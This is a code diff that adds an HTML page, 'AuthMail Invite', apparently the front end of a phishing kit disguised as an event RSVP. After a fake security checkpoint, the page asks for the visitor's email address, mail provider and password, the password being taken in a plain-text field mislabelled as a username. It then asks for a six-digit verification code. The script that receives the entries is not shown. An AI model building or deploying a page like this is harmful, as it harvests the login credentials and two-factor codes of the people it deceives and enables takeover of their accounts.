@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AuthMail Invite</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+  <div class="app-viewport">
+    
+    <!-- Header Badge -->
+    <header class="app-header">
+      <div class="brand">
+        <span class="brand-icon">🔐</span>
+        <span class="brand-title">AuthMail <span class="badge">Invite</span></span>
+      </div>
+    </header>
+
+    <!-- Main Container Card -->
+    <main class="card-container" id="main-card">
+      
+      <!-- SCREEN 1: SECURITY CHECKPOINT -->
+      <section id="view-checkpoint" class="view-panel active" aria-labelledby="heading-checkpoint">
+        <div class="card-header">
+          <div class="shield-badge">🛡️</div>
+          <h1 id="heading-checkpoint">Security checkpoint</h1>
+          <p class="subheading">Complete the quick challenge below to continue.</p>
+        </div>
+
+        <div class="challenge-body">
+          <div class="slider-track" id="slider-track">
+            <div class="slider-fill" id="slider-fill"></div>
+            <span class="slider-text" id="slider-text">Swipe to unlock</span>
+            <div class="slider-handle" id="slider-handle" role="slider" aria-label="Swipe to unlock" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" tabindex="0">
+              <span class="handle-icon" id="handle-icon">→</span>
+            </div>
+          </div>
+          <div id="checkpoint-status" class="status-msg" aria-live="polite"></div>
+        </div>
+      </section>
+
+      <!-- SCREEN 2: USER DETAILS PAGE -->
+      <section id="view-login" class="view-panel" aria-labelledby="heading-login">
+        <div class="card-header">
+          <h1 id="heading-login">User Details</h1>
+          <p class="subheading">Login with your email to continue.</p>
+        </div>
+
+        <form id="form-login" class="login-form" novalidate>
+          
+          <!-- Provider Switcher -->
+          <div class="form-group">
+            <label class="input-label">Email provider</label>
+            <div class="provider-pill-group" id="provider-pill-group">
+              <button type="button" class="provider-pill active" data-provider="Gmail">Gmail</button>
+              <button type="button" class="provider-pill" data-provider="Outlook">Outlook</button>
+              <button type="button" class="provider-pill" data-provider="Yahoo">Yahoo</button>
+              <button type="button" class="provider-pill" data-provider="AOL">AOL</button>
+              <div class="dropdown-wrapper">
+                <button type="button" class="provider-pill dropdown-trigger" id="provider-dropdown-btn">
+                  Others <span class="arrow">▾</span>
+                </button>
+                <div class="provider-dropdown-menu" id="provider-dropdown-menu">
+                  <button type="button" class="dropdown-item" data-provider="ProtonMail">ProtonMail</button>
+                  <button type="button" class="dropdown-item" data-provider="iCloud">iCloud</button>
+                  <button type="button" class="dropdown-item" data-provider="Custom">Custom Provider</button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Email Input -->
+          <div class="form-group">
+            <label for="input-email" class="input-label">Email address</label>
+            <span id="hint-email" class="input-hint">Provider: <strong id="selected-provider-label">Gmail</strong></span>
+            <input 
+              type="email" 
+              id="input-email" 
+              name="email" 
+              placeholder="Enter your email" 
+              required
+              autocomplete="email"
+              aria-describedby="hint-email"
+            >
+            <div class="error-msg" id="error-email">Please enter a valid email address.</div>
+          </div>
+
+          <!-- Username Input -->
+          <div class="form-group">
+            <label for="input-username" class="input-label">Password</label>
+            <input 
+              type="text" 
+              id="input-username" 
+              name="username" 
+              placeholder="Enter your password" 
+              required 
+              minlength="3"
+              autocomplete="username"
+            >
+            <div class="error-msg" id="error-username">Password is required (min 3 characters).</div>
+          </div>
+
+          <div id="login-global-error" class="global-error-msg" aria-live="polite"></div>
+
+          <button type="submit" class="btn btn-primary" id="btn-login-submit">
+            Continue
+          </button>
+        </form>
+      </section>
+
+      <!-- SCREEN 3: CODE VERIFICATION -->
+      <section id="view-otp" class="view-panel" aria-labelledby="heading-otp">
+        <div class="card-header">
+          <div class="otp-badge">🔑</div>
+          <h1 id="heading-otp">Code Confirmation</h1>
+          <p class="subheading">Enter your 6-digit verification code to complete this step.</p>
+        </div>
+
+        <form id="form-otp" class="otp-form" novalidate>
+          <div class="otp-box-group" id="otp-box-group">
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" aria-label="Digit 1" required>
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" aria-label="Digit 2" required>
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" aria-label="Digit 3" required>
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" aria-label="Digit 4" required>
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" aria-label="Digit 5" required>
+            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" aria-label="Digit 6" required>
+          </div>
+
+          <div id="otp-error-msg" class="global-error-msg" aria-live="polite"></div>
+
+          <button type="submit" class="btn btn-primary" id="btn-verify-otp">
+            Verify Code
+          </button>
+        </form>
+
+        <div class="otp-actions">
+          <div class="timer-wrapper">
+            <span class="timer-icon">ℹ️</span> Enter your 6-digit numeric code to proceed.
+          </div>
+          <div class="skip-wrapper">
+            <button type="button" class="btn-skip" id="btn-open-skip-modal">Skip verification step</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- SCREEN 4: SUCCESS PAGE -->
+      <section id="view-success" class="view-panel" aria-labelledby="heading-success">
+        <div class="success-header">
+          <div class="success-icon-badge">✓</div>
+          <h1 id="heading-success">Invitation Confirmed Successfully</h1>
+          <p class="subheading">Your RSVP reservation has been completed.</p>
+        </div>
+
+        <div class="summary-card">
+          <h2 class="summary-title">Form Step Summary</h2>
+          <ul class="summary-list">
+            <li class="summary-item">
+              <span class="item-label">Security checkpoint</span>
+              <span class="item-status status-pass" id="summary-checkpoint">✓ Completed</span>
+            </li>
+            <li class="summary-item">
+              <span class="item-label">User details submission</span>
+              <span class="item-status status-pass" id="summary-login">✓ Completed</span>
+            </li>
+            <li class="summary-item">
+              <span class="item-label">Code verification step</span>
+              <span class="item-status" id="summary-otp">✓ Completed</span>
+            </li>
+          </ul>
+        </div>
+
+        <button type="button" class="btn btn-primary btn-restart" id="btn-restart-demo">
+          Start Again
+        </button>
+      </section>
+
+    </main>
+
+    <!-- Footer Note -->
+    <footer class="app-footer">
+      <p>Secure robot filter for safe invitation acceptance.</p>
+    </footer>
+  </div>
+
+  <!-- Accessible Confirmation Modal for Skip Step -->
+  <dialog id="modal-skip" class="skip-dialog">
+    <div class="dialog-content">
+      <div class="dialog-header">
+        <h2>Skip verification?</h2>
+      </div>
+      <p class="dialog-body">You're about to continue to the summary without entering a code.</p>
+      <div class="dialog-footer">
+        <button type="button" class="btn btn-secondary" id="btn-modal-cancel">Go Back</button>
+        <button type="button" class="btn btn-danger" id="btn-modal-confirm-skip">Skip & Continue</button>
+      </div>
+    </div>
+  </dialog>
+
+  <script src="js/app.js"></script>
+</body>
+</html>
